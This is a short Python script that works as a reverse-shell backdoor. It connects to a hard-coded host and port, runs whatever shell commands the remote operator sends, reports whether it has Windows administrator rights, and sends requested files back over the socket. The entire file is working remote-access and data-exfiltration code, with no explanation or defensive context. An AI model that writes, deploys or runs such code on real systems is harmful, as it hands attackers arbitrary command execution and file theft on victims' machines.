import socket
import subprocess
import ctypes
import os



def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() !=0
    except:
        return  False

def letGrab(mysocket, path):
    try:
        if os.path.exists(path):
            with open(path, 'rb') as f:
                while chunk :=f.read(5000):
                    mysocket.send(chunk)
            mysocket.send(b"DONE") #indicate end of file transfer
        else:
            mysocket.send(b"File not found")
    except Exception as e:
        mysocket.send(f"[-] Error in file transfer: {str(e)}".encode())



def conn():
    mysocket = socket.socket()
    mysocket.connect(("192.168.159.134", 8080))
    while True:
        cmd = mysocket.recv(5000).decode()
        if "term" in cmd:
            mysocket.close()
            break
        elif "checkPrivilege" in cmd:
            if is_admin():
                mysocket.send(b"[+] Running with admin priv\n")
            else:
                mysocket.send(b"[+] User Priv. (NO Admin Privligese)\n")
        elif cmd.startswith('grab'):
            parts = cmd.split('*')
            if len(parts) <2:
                mysocket.send(b"[-] Invalid grab command format")
                continue
            cmds, path = parts
            letGrab(mysocket, path)
        else:
            CMD = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            mysocket.send(CMD.stdout.read())
            mysocket.send(CMD.stderr.read())

def main():
    conn()
if __name__ == "__main__":
    main()
